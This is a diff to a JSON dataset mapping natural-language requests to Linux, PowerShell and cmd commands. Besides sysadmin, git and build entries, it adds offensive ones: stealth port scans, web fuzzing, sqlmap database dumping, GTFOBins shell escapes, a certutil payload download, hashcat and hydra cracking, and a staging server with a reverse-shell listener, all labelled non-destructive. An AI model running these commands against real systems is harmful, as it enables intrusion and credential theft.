@@ -224,20 +224,20 @@
     "category": "PROCESS",
     "canonical_nl": "show top 5 memory consuming processes",
     "default_cmd": "ps aux --sort=-%mem | head -n 6",
-    "powershell_cmd": "Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 5 Name, Id, @{N='Memory(MB)';E={[math]::Round($_.WorkingSet64/1MB, 2)}} | Format-Table -AutoSize",
+    "powershell_cmd": "Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 5 -Property Name,Id,WorkingSet64",
     "cmd_exe": "tasklist /fi \"memusage gt 100000\"",
     "is_destructive": false,
-    "explanation": "Sorts all active processes by resident memory footprint and displays top 5 in formatted MB."
+    "explanation": "Sorts all active processes by resident memory footprint and displays top 5."
   },
   {
     "action_id": "proc_top_cpu",
     "category": "PROCESS",
     "canonical_nl": "show top 5 cpu consuming processes",
     "default_cmd": "ps aux --sort=-%cpu | head -n 6",
-    "powershell_cmd": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, Id, @{N='CPU(s)';E={[math]::Round($_.CPU, 2)}} | Format-Table -AutoSize",
+    "powershell_cmd": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 -Property Name,Id,CPU",
     "cmd_exe": "tasklist",
     "is_destructive": false,
-    "explanation": "Lists top 5 processes sorted in descending order of CPU load."
+    "explanation": "Lists processes sorted in descending order of CPU load percentage."
   },
   {
     "action_id": "sys_free_disk_space",
@@ -247,17 +247,17 @@
     "powershell_cmd": "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object DeviceID, VolumeName, @{N='Free(GB)';E={[math]::Round($_.FreeSpace/1GB, 2)}}, @{N='Used(GB)';E={[math]::Round(($_.Size - $_.FreeSpace)/1GB, 2)}}, @{N='Total(GB)';E={[math]::Round($_.Size/1GB, 2)}}, @{N='PercentFree';E={[math]::Round(($_.FreeSpace/$_.Size)*100, 1)}} | Format-Table -AutoSize",
     "cmd_exe": "powershell -NoProfile -Command \"Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object DeviceID, VolumeName, @{N='Free(GB)';E={[math]::Round($_.FreeSpace/1GB, 2)}}, @{N='Used(GB)';E={[math]::Round(($_.Size - $_.FreeSpace)/1GB, 2)}}, @{N='Total(GB)';E={[math]::Round($_.Size/1GB, 2)}}, @{N='PercentFree';E={[math]::Round(($_.FreeSpace/$_.Size)*100, 1)}} | Format-Table -AutoSize\"",
     "is_destructive": false,
-    "explanation": "Reports available storage, used capacity, and mountpoints across all volumes in human-readable GB table."
+    "explanation": "Reports available storage, used capacity, and mountpoints across all volumes."
   },
   {
     "action_id": "sys_memory_usage",
     "category": "SYSTEM",
     "canonical_nl": "show current ram memory usage in human readable format",
     "default_cmd": "free -h",
-    "powershell_cmd": "Get-CimInstance Win32_OperatingSystem | Select-Object @{N='Total(GB)';E={[math]::Round($_.TotalVisibleMemorySize/1MB,2)}}, @{N='Free(GB)';E={[math]::Round($_.FreePhysicalMemory/1MB,2)}}, @{N='Used(GB)';E={[math]::Round(($_.TotalVisibleMemorySize - $_.FreePhysicalMemory)/1MB,2)}} | Format-Table -AutoSize",
+    "powershell_cmd": "Get-CimInstance Win32_OperatingSystem | Select-Object @{Name='TotalGB';Expression={[math]::Round($_.TotalVisibleMemorySize/1MB,2)}},@{Name='FreeGB';Expression={[math]::Round($_.FreePhysicalMemory/1MB,2)}}",
     "cmd_exe": "systeminfo | findstr /C:\"Total Physical Memory\" /C:\"Available Physical Memory\"",
     "is_destructive": false,
-    "explanation": "Displays total, used, free, and cached system RAM in gigabytes table."
+    "explanation": "Displays total, used, free, and cached system RAM in gigabytes/megabytes."
   },
   {
     "action_id": "fs_find_delete_logs_older_30d",
@@ -274,7 +274,7 @@
     "category": "FILESYSTEM",
     "canonical_nl": "find all files larger than 100MB and sort by size",
     "default_cmd": "find . -type f -size +100M -exec ls -lh {} + | sort -k5 -rh",
-    "powershell_cmd": "Get-ChildItem -Recurse -File | Where-Object Length -gt 100MB | Sort-Object Length -Descending | Select-Object -First 10 Name, @{N='Size(MB)';E={[math]::Round($_.Length/1MB, 2)}} | Format-Table -AutoSize",
+    "powershell_cmd": "Get-ChildItem -Recurse -File | Where-Object Length -gt 100MB | Sort-Object Length -Descending | Select-Object -First 10 Name,Length",
     "cmd_exe": "forfiles /S /M * /C \"cmd /c if @fsize GEQ 104857600 echo @path @fsize\"",
     "is_destructive": false,
     "explanation": "Scans directory tree for files exceeding 100 megabytes and sorts them descending."
@@ -358,5 +358,245 @@
     "cmd_exe": "kubectl rollout restart deployment/{deploy} -n {ns}",
     "is_destructive": false,
     "explanation": "Triggers an orderly rolling restart for pods in the target deployment."
+  },
+  {
+    "action_id": "polyglot_compile_cpp20",
+    "category": "POLYGLOT_DEV",
+    "canonical_nl": "compile modern C++20 source file with optimizations and warnings",
+    "default_cmd": "g++ -std=c++20 -O2 -Wall -Wextra {file} -o {out}",
+    "powershell_cmd": "g++ -std=c++20 -O2 -Wall -Wextra {file} -o {out}.exe",
+    "cmd_exe": "cl /std:c++20 /EHsc /O2 {file} /Fe:{out}.exe",
+    "is_destructive": false,
+    "explanation": "Compiles C++ source with C++20 standard dialect, O2 optimization and all warnings."
+  },
+  {
+    "action_id": "polyglot_compile_rust",
+    "category": "POLYGLOT_DEV",
+    "canonical_nl": "build standalone rust file or cargo project in release mode",
+    "default_cmd": "cargo build --release",
+    "powershell_cmd": "cargo build --release",
+    "cmd_exe": "cargo build --release",
+    "is_destructive": false,
+    "explanation": "Builds Rust project with full optimizations for production release."
+  },
+  {
+    "action_id": "polyglot_run_java_single_file",
+    "category": "POLYGLOT_DEV",
+    "canonical_nl": "run single java source file directly without separate compile step",
+    "default_cmd": "java {file}",
+    "powershell_cmd": "java {file}",
+    "cmd_exe": "java {file}",
+    "is_destructive": false,
+    "explanation": "Directly launches Java 11+ single-file source code without prior javac compile step."
+  },
+  {
+    "action_id": "polyglot_build_golang",
+    "category": "POLYGLOT_DEV",
+    "canonical_nl": "compile go binary stripped of debug symbols and dwarf tables",
+    "default_cmd": "go build -ldflags=\"-s -w\" -o {out} {file}",
+    "powershell_cmd": "go build -ldflags=\"-s -w\" -o {out}.exe {file}",
+    "cmd_exe": "go build -ldflags=\"-s -w\" -o {out}.exe {file}",
+    "is_destructive": false,
+    "explanation": "Compiles Go package into stripped lightweight binary with symbol tables removed."
+  },
+  {
+    "action_id": "git_undo_last_commit_soft",
+    "category": "GIT",
+    "canonical_nl": "undo the last commit and keep changes staged in index",
+    "default_cmd": "git reset --soft HEAD~1",
+    "powershell_cmd": "git reset --soft HEAD~1",
+    "cmd_exe": "git reset --soft HEAD~1",
+    "is_destructive": false,
+    "explanation": "Rewinds HEAD by one commit while leaving all file modifications staged."
+  },
+  {
+    "action_id": "git_revert_commit_clean",
+    "category": "GIT",
+    "canonical_nl": "safely revert public commit creating inverse change",
+    "default_cmd": "git revert --no-edit {hash}",
+    "powershell_cmd": "git revert --no-edit {hash}",
+    "cmd_exe": "git revert --no-edit {hash}",
+    "is_destructive": false,
+    "explanation": "Creates a new commit reversing the changes introduced by target commit."
+  },
+  {
+    "action_id": "git_reflog_inspect_history",
+    "category": "GIT",
+    "canonical_nl": "view git reflog state transitions to recover deleted commits or branches",
+    "default_cmd": "git reflog -n 15",
+    "powershell_cmd": "git reflog -n 15",
+    "cmd_exe": "git reflog -n 15",
+    "is_destructive": false,
+    "explanation": "Displays historical HEAD transitions allowing recovery of unreferenced commits."
+  },
+  {
+    "action_id": "github_delete_repo_cli",
+    "category": "GIT",
+    "canonical_nl": "delete remote github repository using gh cli without confirmation prompt",
+    "default_cmd": "gh repo delete {repo} --yes",
+    "powershell_cmd": "gh repo delete {repo} --yes",
+    "cmd_exe": "gh repo delete {repo} --yes",
+    "is_destructive": true,
+    "explanation": "Permanently deletes the specified GitHub repository via GitHub CLI."
+  },
+  {
+    "action_id": "sysadmin_systemctl_service_restart",
+    "category": "SYSADMIN_CORE",
+    "canonical_nl": "restart and inspect systemd service status",
+    "default_cmd": "systemctl restart {svc} && systemctl status {svc} --no-pager",
+    "powershell_cmd": "Restart-Service {svc}; Get-Service {svc}",
+    "cmd_exe": "net stop {svc} && net start {svc}",
+    "is_destructive": false,
+    "explanation": "Restarts the target systemd service and displays current running status."
+  },
+  {
+    "action_id": "sysadmin_ss_listening_ports",
+    "category": "SYSADMIN_CORE",
+    "canonical_nl": "display all listening TCP and UDP sockets with process names",
+    "default_cmd": "ss -tulpn",
+    "powershell_cmd": "Get-NetTCPConnection -State Listen",
+    "cmd_exe": "netstat -ano | findstr LISTENING",
+    "is_destructive": false,
+    "explanation": "Lists all open listening sockets with PID and application names."
+  },
+  {
+    "action_id": "sysadmin_disk_usage_top_folders",
+    "category": "SYSADMIN_CORE",
+    "canonical_nl": "find largest space-consuming directories and files on disk",
+    "default_cmd": "du -ahx / 2>/dev/null | sort -rh | head -n 20",
+    "powershell_cmd": "Get-ChildItem C:\\ -Recurse -ErrorAction SilentlyContinue | Sort-Object Length -Descending | Select-Object -First 20",
+    "cmd_exe": "dir C:\\ /s /o-s",
+    "is_destructive": false,
+    "explanation": "Traverses filesystem to locate and sort the 20 largest space consumers."
+  },
+  {
+    "action_id": "recon_nmap_syn_stealth",
+    "category": "RECON_SCANNING",
+    "canonical_nl": "execute fast SYN stealth port scan with service versions and default scripts",
+    "default_cmd": "nmap -sS -sV -sC -T4 -v {target}",
+    "powershell_cmd": "nmap -sS -sV -sC -T4 -v {target}",
+    "cmd_exe": "nmap -sS -sV -sC -T4 -v {target}",
+    "is_destructive": false,
+    "explanation": "Performs TCP SYN half-open scan with service detection and default NSE scripts."
+  },
+  {
+    "action_id": "recon_nmap_ping_bypass_pn",
+    "category": "RECON_SCANNING",
+    "canonical_nl": "scan target ports skipping ICMP host discovery probe",
+    "default_cmd": "nmap -Pn -sV -sC -T4 {target}",
+    "powershell_cmd": "nmap -Pn -sV -sC -T4 {target}",
+    "cmd_exe": "nmap -Pn -sV -sC -T4 {target}",
+    "is_destructive": false,
+    "explanation": "Treats all hosts as online by bypassing ICMP echo requests."
+  },
+  {
+    "action_id": "recon_masscan_fast_sweep",
+    "category": "RECON_SCANNING",
+    "canonical_nl": "sweep large subnet for open web ports at 1000 packets per second",
+    "default_cmd": "masscan -p80,443,8080 {subnet} --rate=1000",
+    "powershell_cmd": "masscan -p80,443,8080 {subnet} --rate=1000",
+    "cmd_exe": "masscan -p80,443,8080 {subnet} --rate=1000",
+    "is_destructive": false,
+    "explanation": "Asynchronously probes subnet for HTTP/HTTPS ports at 1000 pps."
+  },
+  {
+    "action_id": "web_gobuster_dir_fuzz",
+    "category": "WEB_SECURITY",
+    "canonical_nl": "brute-force web directories and file extensions with gobuster",
+    "default_cmd": "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 -q",
+    "powershell_cmd": "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 -q",
+    "cmd_exe": "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 -q",
+    "is_destructive": false,
+    "explanation": "Enumerates hidden URIs and endpoints on HTTP service using multi-threaded brute-forcing."
+  },
+  {
+    "action_id": "web_ffuf_parameter_fuzz",
+    "category": "WEB_SECURITY",
+    "canonical_nl": "discover hidden GET query parameters using ffuf and status code filters",
+    "default_cmd": "ffuf -u \"{url}?FUZZ=1\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,301,302",
+    "powershell_cmd": "ffuf -u \"{url}?FUZZ=1\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,301,302",
+    "cmd_exe": "ffuf -u \"{url}?FUZZ=1\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,301,302",
+    "is_destructive": false,
+    "explanation": "Identifies hidden parameter inputs by matching HTTP 200/301 responses."
+  },
+  {
+    "action_id": "web_sqlmap_dump_dbs",
+    "category": "WEB_SECURITY",
+    "canonical_nl": "automatically detect and dump database schemas via sqlmap batch mode",
+    "default_cmd": "sqlmap -u \"{url}\" --batch --dbs",
+    "powershell_cmd": "sqlmap -u \"{url}\" --batch --dbs",
+    "cmd_exe": "sqlmap -u \"{url}\" --batch --dbs",
+    "is_destructive": false,
+    "explanation": "Performs automated SQL injection payload testing and enumerates database names."
+  },
+  {
+    "action_id": "privesc_gtfobins_find_exec",
+    "category": "PRIVESC",
+    "canonical_nl": "spawn privileged shell via find binary -exec flag",
+    "default_cmd": "find . -exec /bin/sh \\; -quit",
+    "powershell_cmd": "find . -exec /bin/sh \\; -quit",
+    "cmd_exe": "find . -exec /bin/sh \\; -quit",
+    "is_destructive": false,
+    "explanation": "Executes /bin/sh with the effective permissions of the find binary."
+  },
+  {
+    "action_id": "privesc_gtfobins_vim_escape",
+    "category": "PRIVESC",
+    "canonical_nl": "break out of sudo or restricted shell using vim command execution",
+    "default_cmd": "sudo vim -c ':!/bin/sh'",
+    "powershell_cmd": "sudo vim -c ':!/bin/sh'",
+    "cmd_exe": "sudo vim -c ':!/bin/sh'",
+    "is_destructive": false,
+    "explanation": "Spawns an interactive shell directly from Vim session with elevated sudo rights."
+  },
+  {
+    "action_id": "privesc_lolbas_certutil_download",
+    "category": "PRIVESC",
+    "canonical_nl": "download remote binary payload onto windows target using certutil",
+    "default_cmd": "certutil.exe -urlcache -split -f http://{ip}:{port}/{file} {file}",
+    "powershell_cmd": "certutil.exe -urlcache -split -f http://{ip}:{port}/{file} {file}",
+    "cmd_exe": "certutil.exe -urlcache -split -f http://{ip}:{port}/{file} {file}",
+    "is_destructive": false,
+    "explanation": "Leverages native Windows Certificate utility to fetch arbitrary payloads over HTTP."
+  },
+  {
+    "action_id": "cracking_hashcat_ntlm_rockyou",
+    "category": "CRACKING",
+    "canonical_nl": "crack NTLM password hashes using hashcat with rockyou wordlist on GPU",
+    "default_cmd": "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O",
+    "powershell_cmd": "hashcat.exe -m 1000 -a 0 hashes.txt rockyou.txt -O",
+    "cmd_exe": "hashcat.exe -m 1000 -a 0 hashes.txt rockyou.txt -O",
+    "is_destructive": false,
+    "explanation": "Performs GPU-accelerated straight dictionary attack on NTLM password hashes (mode 1000)."
+  },
+  {
+    "action_id": "cracking_hydra_ssh_bruteforce",
+    "category": "CRACKING",
+    "canonical_nl": "brute-force SSH credentials using hydra and rockyou wordlist",
+    "default_cmd": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4",
+    "powershell_cmd": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4",
+    "cmd_exe": "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4",
+    "is_destructive": false,
+    "explanation": "Conducts parallelized network authentication brute-force against SSH daemon."
+  },
+  {
+    "action_id": "orchestration_scan_then_fuzz",
+    "category": "ORCHESTRATION",
+    "canonical_nl": "chain port scan and automated web directory fuzzing on discovered http ports",
+    "default_cmd": "nmap -p 80,443 -sV {target} && gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q",
+    "powershell_cmd": "nmap -p 80,443 -sV {target}; gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q",
+    "cmd_exe": "nmap -p 80,443 -sV {target} && gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -q",
+    "is_destructive": false,
+    "explanation": "Pipelines initial network discovery directly into web content brute-forcing upon success."
+  },
+  {
+    "action_id": "orchestration_stage_and_listen",
+    "category": "ORCHESTRATION",
+    "canonical_nl": "start background payload staging server and open reverse shell listener",
+    "default_cmd": "python3 -m http.server {sport} & ncat -lvnp {lport}",
+    "powershell_cmd": "Start-Process python -ArgumentList '-m http.server {sport}'; ncat -lvnp {lport}",
+    "cmd_exe": "start python -m http.server {sport} && ncat -lvnp {lport}",
+    "is_destructive": false,
+    "explanation": "Spawns an HTTP staging delivery service in background while keeping foreground listener active."
   }
 ]
